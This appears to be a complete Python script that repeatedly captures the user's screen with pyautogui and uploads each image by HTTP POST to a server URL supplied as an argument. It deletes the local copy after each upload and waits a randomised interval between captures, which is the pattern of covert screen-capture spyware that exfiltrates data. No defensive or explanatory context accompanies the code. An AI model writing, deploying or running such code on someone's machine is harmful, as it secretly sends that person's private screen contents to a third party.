import datetime
import os
import random
import sys
import time
import pyautogui
import requests


def send_screenshots(path, server_url, window_sec):
    while True:
        try:
            screenshot = pyautogui.screenshot()
            file_name = path + "/screenshot_" + str(datetime.datetime.now().strftime("%Y_%m_%d-%H_%M_%S")) + ".png"
            screenshot.save(file_name)

            with open(file_name, "rb") as f:
                response = requests.post(server_url, files={"screenshot": f})
                if response.status_code != 200:
                    print("Failed to send screenshot to server")
                else:
                    print("Screenshot sent to server successfully")

            os.remove(file_name)

        except Exception as e:
            print("Something happened: " + str(e))
        time.sleep(window_sec + random.randint(0, window_sec))  # wait window_sec to 2 * window_sec seconds


if __name__ == "__main__":
    send_screenshots(sys.argv[1], sys.argv[2], int(sys.argv[3]))
